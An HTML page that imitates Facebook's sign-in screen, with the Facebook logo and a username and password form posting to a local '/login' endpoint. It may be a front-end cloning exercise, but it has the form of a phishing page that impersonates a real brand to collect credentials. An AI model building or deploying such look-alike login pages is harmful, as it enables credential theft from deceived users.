<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="header">
        <div class="logo">
            <img src="https://imgs.search.brave.com/R7QFjhcN3QHHbXP9SLYAGHvMBmcmWfj00awbJWMo6gI/rs:fit:560:320:1/g:ce/aHR0cHM6Ly91cGxv/YWQud2lraW1lZGlh/Lm9yZy93aWtpcGVk/aWEvZW4vdGh1bWIv/MC8wNC9GYWNlYm9v/a19mX2xvZ29fJTI4/MjAyMSUyOS5zdmcv/NjQwcHgtRmFjZWJv/b2tfZl9sb2dvXyUy/ODIwMjElMjkuc3Zn/LnBuZw" alt="Facebook Logo">
        </div>
    </div>
    <div class="login-box">
        <h1>Facebook</h1>
        <form action="/login" method="post">
            <label for="username">Username or Email</label>
            <input type="text" id="username" placeholder="Username or Email" class="input-field" required autocomplete="username">
            <label for="password">Password</label>
            <input type="password" id="password" placeholder="Password" class="input-field" required autocomplete="current-password">
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <div class="footer-links">
            <a href="#">Forgot Password?</a> &middot;
            <a href="#">Sign Up for Facebook</a>
        </div>
    </div>
</body>
</html>
